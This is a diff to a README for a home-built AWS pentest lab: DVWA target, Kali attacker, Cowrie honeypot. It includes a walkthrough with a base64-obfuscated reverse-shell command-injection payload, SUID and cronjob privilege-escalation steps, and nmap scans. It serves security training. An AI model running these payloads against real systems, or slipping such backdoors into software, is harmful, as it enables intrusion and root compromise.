@@ -2,6 +2,13 @@
 Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux tools, identify security flaws, then harden and secure the environment using AWS-native services.
 ![Pentest-lab](https://github.com/user-attachments/assets/7d1bc252-44ac-433d-a33b-912193541ebb)
 
+## 🎯 Lab Objectives
+
+- Simulate real-world attack scenarios on a segmented AWS network
+- Practice enumeration, exploitation, and privilege escalation
+- Learn pivoting and lateral movement within cloud environments
+- Deploy and interact with honeypots (e.g., Cowrie)
+
 ## 📚 Table of Contents
 1. [Network Architecture](#-network-architecture)
 2. [Routing](#-routing)
@@ -35,7 +42,7 @@ Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux 
 |-----------|----------|------------|----------------|-----------------------------------|
 | SSH       | TCP      | 22         | 0.0.0.0/0      | Remote access to Kali             |
 | All TCP   | TCP      | 0-65535    | 10.0.0.0/16    | Full comms in VPC                 |
-| HTTP      | TCP      | 80         | 0.0.0.0/0      | Hosting files (Flask/Nginx/etc.)  |
+| HTTP      | TCP      | 80         | 0.0.0.0/0      | Hosting files                     |
 | Custom    | TCP      | 4444       | 10.0.2.0/24    | Netcat reverse shell listener     |
 | Custom    | TCP      | 8000       | 10.0.2.0/24    | chisel/proxy listener             |
 | ICMP      | ICMP     | All        | 10.0.0.0/16    | Ping across VPC                   |
@@ -44,7 +51,7 @@ Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux 
 ### 🧱 Target-sg
 | Rule Type | Protocol | Port Range | Source         | Purpose                         |
 |-----------|----------|------------|----------------|---------------------------------|
-| SSH       | TCP      | 22         | <YOUR_IP>/32   | Admin SSH (restricted)          |
+| SSH       | TCP      | 22         | x.x.x.x/32     | Admin SSH (restricted)          |
 | SSH       | TCP      | 22         | 10.0.1.0/24    | Attacker to Target              |
 | HTTP      | TCP      | 80         | 0.0.0.0/0      | DVWA Web App                    |
 | Custom    | TCP      | 4444       | 10.0.1.0/24    | Reverse Shell                   |
@@ -66,8 +73,8 @@ Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux 
 | Role              | Hostname        | Private IP     | Public IP         |
 |-------------------|------------------|----------------|--------------------|
 | Kali Attacker     | kali             | 10.0.1.x        | Elastic IP assigned |
-| DVWA Target       | dvwa-server      | 10.0.2.241      | 18.246.218.175     |
-| Internal Server   | internal-server  | 10.0.3.129      | None               |
+| DVWA Target       | dvwa-server      | 10.0.2.x        | Elastic IP assigned |
+| Internal Server   | internal-server  | 10.0.3.x        | None               |
 
 ## 🛠️ DVWA Server Configuration
 
@@ -128,8 +135,16 @@ FLUSH PRIVILEGES;
 exit
 
 echo "flag{you_pivoted_correctly}" | sudo tee /root/super_secret_flag.txt
+```
+## 🐍 Setup Cowrie Honeypot
 
-# Setup Cowrie Honeypot
+Cowrie is a medium-interaction SSH honeypot that logs brute-force attacks and command interactions.
+
+Cowrie listens on:
+- Port 22 and 2222 (via iptables and `authbind`)
+- Real SSH was moved to 22222
+
+```bash
 sudo apt install -y git python3 python3-pip python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev authbind
 sudo adduser --disabled-password --gecos "" cowrie
 sudo su - cowrie
@@ -183,23 +198,65 @@ sudo chown root:root /usr/local/bin/vimroot
 sudo chmod 4755 /usr/local/bin/vimroot
 ```
 
-> This script introduces 3 vulnerabilities:
-> - A world-writable SUID root shell
-> - A cronjob that modifies `/bin/bash` permissions every minute
-> - A SUID-enabled version of Vim
+### 🛠️ Vulnerabilities Introduced
+| Type               | Location                     | Exploitability         |
+|--------------------|------------------------------|------------------------|
+| World-Writable SUID| `/usr/local/bin/rootme`      | `bash -p`              |
+| Cronjob Backdoor   | `/tmp/pwn.sh` via `/etc/crontab` | Scheduled root shell |
+| SUID Vim           | `/usr/local/bin/vimroot`     | `:!/bin/bash` in Vim   |
 
-## 🚀 Next Steps: Attacking
 
-We'll now begin:
-- Reconnaissance and scanning
-- Web app exploitation via DVWA
-- Reverse shell to the target
-- Privilege escalation using the SUID/cronjob
-- Internal network scanning
-- Pivot to internal-server
-- Brute-forcing and honeypot detection
+## 🧰 Tools Used
+- **Kali Linux** – Offensive security tools and attack platform
+- **DVWA** – Vulnerable PHP/MySQL web application
+- **Cowrie** – SSH honeypot to capture unauthorized access
+- **Netcat, Nmap, Hydra, ProxyChains, Chisel** – Enumeration, reverse shells, tunneling
+- **LinPEAS, Linux Exploit Suggester** – Privilege escalation enumeration
+
+## 🚀 Attacking the Lab
+
+### 🔍 Step 1: Reconnaissance
+Performed from the Kali instance:
+```bash
+nmap -sV -T4 -p- 18.246.218.175
+```
+- Discovered open ports: 22 (SSH), 80 (HTTP)
+- Web app discovered: `http://<DVWA SERVER Public IP>/dvwa`
+
+### 🌐 Step 2: Web Vulnerability Scanning
+- Set DVWA security level to `low`
+- Tools used:
+  - Nikto
+  - Command Injection module in DVWA
+
+### 🧠 Step 3: Command Injection to Reverse Shell
+Executed:
+```bash
+127.0.0.1; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuNzgvNDQ0NCAwPiYxCg== | base64 -d | bash
+```
+- Shell received in netcat listener:
+```bash
+nc -lvnp 4444
+```
+- Reverse shell as `www-data`
+
+### 🛠️ Step 4: Privilege Escalation on DVWA
+- Exploited SUID binary `/usr/local/bin/rootme`:
+```bash
+/usr/local/bin/rootme -p
+bash -p
+whoami  # root
+```
+
+### 🔁 Step 5: Internal Network Scanning from DVWA
+- Scanned `10.0.3.129` (Internal Server):
+```bash
+nmap -sS -sV -T4 10.0.3.129
+```
+- Open ports found:
+  - 22, 2222 → Cowrie honeypot
+  - 22222 → Real SSH
+  - 3306 → MySQL
 
 ---
-
-**🧠 Pro Tip:** Keep documenting each tool, exploit, and screenshot. This will make your final report and GitHub project even more impressive!
 
